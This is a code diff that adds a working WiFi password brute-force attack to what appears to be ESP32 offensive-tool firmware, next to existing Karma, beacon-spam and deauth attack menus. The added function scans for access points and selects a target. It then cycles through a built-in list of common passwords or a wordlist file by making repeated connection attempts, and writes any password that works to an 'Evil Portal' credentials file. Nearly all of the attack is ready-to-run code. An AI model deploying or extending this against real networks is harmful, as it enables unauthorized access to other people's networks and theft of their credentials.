@@ -18,6 +18,36 @@
 #include "karma_attack.h"
 #include "sniffer.h"
 #include "vector"
+
+// Format MAC address from byte array
+static String macToStr(const uint8_t *mac) {
+    char buf[18];
+    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
+             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+    return String(buf);
+}
+
+// Simple confirmation dialog
+static bool confirmAttack(const String &msg) {
+    tft.fillScreen(bruceConfig.bgColor);
+    drawMainBorder();
+    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
+    tft.setTextSize(2);
+    tft.setCursor((tftWidth - tft.textWidth("CONFIRM")) / 2, 20);
+    tft.print("CONFIRM");
+
+    tft.setTextSize(1);
+    tft.setCursor(10, 50);
+    tft.print(msg);
+
+    tft.setCursor(10, tftHeight - 30);
+    tft.setTextColor(TFT_CYAN, bruceConfig.bgColor);
+    tft.print("[SEL] Yes  [ESC] No");
+
+    while (!check(SelPress) && !check(EscPress)) delay(50);
+    delay(200);
+    return check(SelPress);
+}
 #include <Arduino.h>
 #include <globals.h>
 #include <nvs_flash.h>
@@ -248,13 +278,14 @@ void wifi_atk_menu() {
 
     bool scanAtks = false;
     options = {
-        {"Target Atks",     [&]() { scanAtks = true; }     },
+        {"Target Atks",        [&]() { scanAtks = true; }       },
+        {"WiFi Pass Brute Force", [=]() { wifi_bruteforce_menu(); }},
 #ifndef LITE_VERSION
-        {"Karma Attack",    [=]() { karma_setup(); }       },
+        {"Karma Attack",       [=]() { karma_setup(); }         },
 #endif
-        {"Beacon SPAM",     [=]() { beaconAttack(); }      },
-        {"Deauth Flood",    [=]() { deauthFloodAttack(); } },
-        {"Enhanced Deauth", [=]() { enhancedDeauthMenu(); }},
+        {"Beacon SPAM",        [=]() { beaconAttack(); }        },
+        {"Deauth Flood",       [=]() { deauthFloodAttack(); }   },
+        {"Enhanced Deauth",    [=]() { enhancedDeauthMenu(); }  },
     };
     addOptionToMainMenu();
     loopOptions(options);
@@ -928,4 +959,277 @@ void enhancedDeauthMenu() {
     };
     addOptionToMainMenu();
     loopOptions(options);
+}
+
+void wifi_bruteforce_menu() {
+    resetGlobalState();
+
+    if (WiFi.getMode() == WIFI_MODE_NULL) wifi_complete_cleanup(false);
+
+    // Step 1: Scan and select target AP
+    int nets;
+    displayTextLine("Scanning for APs...");
+    nets = WiFi.scanNetworks(false, showHiddenNetworks);
+    ap_records.clear();
+
+    for (int i = 0; i < nets; i++) {
+        wifi_ap_record_t record;
+        memset(&record, 0, sizeof(record));
+        memcpy(record.bssid, WiFi.BSSID(i), 6);
+        record.primary = static_cast<uint8_t>(WiFi.channel(i));
+        if (strlen(WiFi.SSID(i).c_str()) > 0) {
+            strncpy((char *)record.ssid, WiFi.SSID(i).c_str(), sizeof(record.ssid) - 1);
+            record.ssid[sizeof(record.ssid) - 1] = '\0';
+        } else {
+            record.ssid[0] = '\0';
+        }
+        ap_records.push_back(record);
+    }
+
+    if (ap_records.empty()) {
+        displayError("No APs found", true);
+        return;
+    }
+
+    options.clear();
+    for (size_t i = 0; i < ap_records.size(); i++) {
+        String ssid = (char *)ap_records[i].ssid;
+        if (ssid.length() == 0) ssid = "<Hidden>";
+        String bssid = macToStr(ap_records[i].bssid);
+        int ch = ap_records[i].primary;
+        int32_t rssi = WiFi.RSSI(i);
+        String optText = ssid + " (" + String(rssi) + "dBm|ch." + String(ch) + "|" + bssid + ")";
+        options.push_back({optText.c_str(), [=]() {
+            ap_record = ap_records[i];
+        }});
+    }
+    addOptionToMainMenu();
+    loopOptions(options);
+    if (returnToMenu || ap_record.ssid[0] == '\0') {
+        options.clear();
+        return;
+    }
+
+    String targetSSID = (char *)ap_record.ssid;
+    String targetBSSID = macToStr(ap_record.bssid);
+    uint8_t targetChannel = ap_record.primary;
+
+    // Step 2: Select wordlist source (built-in or file)
+    options.clear();
+    options.push_back({"Built-in Common Passwords (32)", []() {}});
+    options.push_back({"Wordlist File (.txt/.lst/.csv)", []() {}});
+    options.push_back({"Back", [&]() { returnToMenu = true; }});
+    addOptionToMainMenu();
+    loopOptions(options);
+    if (returnToMenu) return;
+
+    // We need to know which option was selected
+    // Since we can't easily tell from the lambda, use a different approach
+    // Check if we have a wordlist file selected via loopSD
+    bool useBuiltin = false;
+    String wordlistPath = "";
+    std::vector<String> passwords;
+
+    // Step 2: Select wordlist source using menu
+    static int bf_source_choice = -1;
+    bf_source_choice = -1;
+
+    options.clear();
+    options.push_back({"Built-in Common Passwords (32)", [&]() { bf_source_choice = 1; }});
+    options.push_back({"Wordlist File from /wordlists", [&]() { bf_source_choice = 2; }});
+    options.push_back({"Back", [&]() { returnToMenu = true; }});
+    addOptionToMainMenu();
+    loopOptions(options);
+
+    if (returnToMenu || bf_source_choice == -1) {
+        options.clear();
+        return;
+    }
+
+    int sourceChoice = bf_source_choice;
+    bf_source_choice = -1;
+
+    if (sourceChoice == 1) {
+        useBuiltin = true;
+        passwords = {
+            "12345678", "123456789", "password", "admin", "admin123", "1234567890",
+            "qwerty", "abc123", "letmein", "welcome", "admin1234", "password1",
+            "password123", "123456789", "12345678", "11111111", "00000000",
+            "88888888", "12341234", "abcd1234", "adminadmin", "root", "root123",
+            "toor", "changeme", "secret", "test123", "wifi", "wifi123",
+            "wireless", "internet", "router", "router123"
+        };
+    } else {
+        FS *fs = nullptr;
+        if (setupSdCard()) fs = &SD;
+        else fs = &LittleFS;
+
+        const String WORDLIST_DIR = "/wordlists";
+        if (!(*fs).exists(WORDLIST_DIR)) (*fs).mkdir(WORDLIST_DIR);
+
+        String wordlist = loopSD(*fs, true, "txt|lst|csv", WORDLIST_DIR);
+        if (wordlist.length() == 0) {
+            displayInfo("Cancelled", true);
+            return;
+        }
+        wordlistPath = wordlist;
+
+        // Load passwords from file
+        File f = (*fs).open(wordlistPath, FILE_READ);
+        if (!f) {
+            displayError("Failed to open wordlist", true);
+            return;
+        }
+        while (f.available()) {
+            String line = f.readStringUntil('\n');
+            line.trim();
+            if (line.length() >= 8 && line.length() <= 63) { // WPA2 min 8, max 63
+                passwords.push_back(line);
+            }
+        }
+        f.close();
+
+        if (passwords.empty()) {
+            displayError("No valid passwords in file (8-63 chars)", true);
+            return;
+        }
+    }
+
+    // Step 3: Confirm and start attack
+    String msg = "Target: " + targetSSID + "\n";
+    msg += "BSSID: " + targetBSSID + "\n";
+    msg += "Channel: " + String(targetChannel) + "\n";
+    msg += "Passwords: " + String(passwords.size()) + "\n";
+    msg += "Start attack?";
+    if (!confirmAttack(msg)) return;
+
+    // Step 4: Attack loop
+    drawMainBorderWithTitle("WiFi Brute Force");
+    tft.setTextSize(FP);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+
+    uint32_t attempts = 0;
+    uint32_t successes = 0;
+    uint32_t startAttackTime = millis();
+    uint32_t lastDisplayUpdate = 0;
+    uint32_t lastRateCalc = 0;
+    uint32_t lastRateAttempts = 0;
+    float currentRate = 0;
+    int consecutiveFailures = 0;
+    int backoffMs = 0;
+    const int MAX_BACKOFF_MS = 5000;
+
+    for (size_t i = 0; i < passwords.size(); i++) {
+        if (check(EscPress)) break;
+
+        String pass = passwords[i];
+        attempts++;
+
+        // Update display every 500ms
+        if (millis() - lastDisplayUpdate > 500) {
+            tft.fillRect(0, 30, tftWidth, tftHeight - 30, bruceConfig.bgColor);
+            tft.setCursor(10, 35);
+            tft.printf("Target: %s\n", targetSSID.c_str());
+            tft.printf("BSSID: %s\n", targetBSSID.c_str());
+            tft.printf("Channel: %d\n", targetChannel);
+            tft.printf("Trying: %s\n", pass.c_str());
+            tft.printf("Attempt: %u/%u\n", attempts, passwords.size());
+            tft.printf("Success: %u\n", successes);
+            tft.printf("Rate: %.1f/s\n", currentRate);
+            if (backoffMs > 0) {
+                tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
+                tft.printf("Backoff: %dms\n", backoffMs);
+                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            }
+            tft.println("[ESC] Stop");
+            lastDisplayUpdate = millis();
+        }
+
+        // Calculate rate every 2 seconds
+        if (millis() - lastRateCalc > 2000) {
+            currentRate = (attempts - lastRateAttempts) / ((millis() - lastRateCalc) / 1000.0);
+            lastRateCalc = millis();
+            lastRateAttempts = attempts;
+        }
+
+        // Apply backoff if needed
+        if (backoffMs > 0) {
+            delay(backoffMs);
+        }
+
+        // Try connection
+        WiFi.disconnect(true);
+        delay(100);
+        WiFi.begin(targetSSID.c_str(), pass.c_str());
+
+        uint32_t connStart = millis();
+        bool connected = false;
+        wl_status_t status = WL_IDLE_STATUS;
+
+        while (millis() - connStart < 5000) { // 5 second timeout per attempt
+            status = WiFi.status();
+            if (status == WL_CONNECTED) {
+                connected = true;
+                break;
+            }
+            if (status == WL_CONNECT_FAILED || status == WL_NO_SSID_AVAIL) {
+                break; // Wrong password or AP gone
+            }
+            vTaskDelay(50);
+        }
+
+        if (connected) {
+            // SUCCESS!
+            successes++;
+            String successMsg = "SUCCESS! Password: " + pass;
+            displayInfo(successMsg, true);
+
+            // Save to Evil Portal creds
+            FS *fs = nullptr;
+            if (setupSdCard()) fs = &SD;
+            else fs = &LittleFS;
+
+            if (!(*fs).exists("/BruceEvilCreds")) (*fs).mkdir("/BruceEvilCreds");
+            File credFile = (*fs).open("/BruceEvilCreds/creds.txt", FILE_APPEND);
+            if (credFile) {
+                credFile.printf("%s|%s|%s\n", targetSSID.c_str(), targetBSSID.c_str(), pass.c_str());
+                credFile.close();
+            }
+
+            // Also save to wifi credentials map
+            bruceConfig.addWifiCredential(targetSSID, pass);
+
+            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+            tft.setCursor(10, tft.getCursorY() + 10);
+            tft.println("CREDENTIALS SAVED!");
+            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+            delay(2000);
+            break; // Stop after first success (or continue if you want all)
+        } else {
+            consecutiveFailures++;
+            // Increase backoff on repeated failures (rate limiting)
+            if (consecutiveFailures > 10) {
+                backoffMs = min(backoffMs + 100, MAX_BACKOFF_MS);
+            } else if (consecutiveFailures > 5) {
+                backoffMs = 200;
+            } else {
+                backoffMs = 0;
+            }
+        }
+
+        // Small delay between attempts
+        delay(50);
+    }
+
+    // Summary
+    uint32_t totalTime = (millis() - startAttackTime) / 1000;
+    String summary = "Attack Complete\n";
+    summary += "Time: " + String(totalTime) + "s\n";
+    summary += "Attempts: " + String(attempts) + "\n";
+    summary += "Success: " + String(successes) + "\n";
+    summary += "Avg Rate: " + String(passwords.size() > 0 ? (float)attempts / (totalTime > 0 ? totalTime : 1) : 0) + "/s";
+    displayInfo(summary, true);
+
+    wifi_atk_unsetWifi();
+    options.clear();
 }
